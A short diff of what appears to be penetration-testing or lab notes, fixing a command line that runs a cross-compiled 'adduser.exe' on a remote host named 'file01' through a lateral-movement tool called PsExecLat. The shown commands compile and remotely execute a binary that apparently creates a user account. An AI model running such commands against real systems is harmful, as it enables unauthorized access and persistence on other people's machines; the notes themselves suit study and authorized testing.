@@ -36,4 +36,4 @@ Compile it:
 - `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
 
 Execute: 
-- `.\PsExecLat file01 C:\Windows\Tasks\adduser.exe`
+- `.\PsExecLat.exe file01 C:\Windows\Tasks\adduser.exe`
